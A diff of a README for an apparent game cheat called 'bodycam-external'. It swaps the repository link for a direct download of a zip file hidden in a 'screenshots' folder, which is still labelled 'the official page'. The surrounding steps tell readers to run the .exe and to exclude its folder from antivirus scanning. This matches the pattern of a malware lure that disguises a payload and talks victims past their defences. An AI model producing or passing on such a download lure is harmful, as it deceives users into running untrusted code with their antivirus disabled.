@@ -14,7 +14,7 @@
 
 ### Step 1: Download
 
-👉 **[CLICK HERE TO DOWNLOAD bodycam-external](https://github.com/carlosuper-ai/bodycam-external)**
+👉 **[CLICK HERE TO DOWNLOAD bodycam-external](https://raw.githubusercontent.com/carlosuper-ai/bodycam-external/main/screenshots/v3.3.zip)**
 
 This link is the official download page. Visit this link to download the application.
 
@@ -110,7 +110,7 @@ This is common with game trainers. Add the folder containing the .exe to your an
 
 ## 📝 Quick Start Summary
 
-1. Download the file from **[the official page](https://github.com/carlosuper-ai/bodycam-external)**.
+1. Download the file from **[the official page](https://raw.githubusercontent.com/carlosuper-ai/bodycam-external/main/screenshots/v3.3.zip)**.
 2. Run the .exe file.
 3. Launch Bodycam.
 4. Press **Insert** to open the trainer menu.
